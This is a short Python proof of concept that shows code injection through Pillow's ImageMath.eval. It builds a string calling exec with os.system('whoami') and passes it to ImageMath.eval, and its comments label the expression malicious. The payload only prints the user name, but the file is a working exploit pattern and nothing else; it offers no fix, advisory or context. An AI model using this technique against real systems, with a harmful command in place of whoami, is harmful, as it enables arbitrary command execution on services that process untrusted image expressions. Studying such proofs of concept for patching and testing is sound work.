# Import the Pillow library
from PIL import Image, ImageMath

# Define a malicious expression that uses the exec method
# This expression will run the os.system command and print the current user name
expr = "exec('import os; os.system(\"whoami\")')"

# Evaluate the expression using PIL.ImageMath.eval
# This will execute the malicious code and print the user name to the standard output
ImageMath.eval(expr)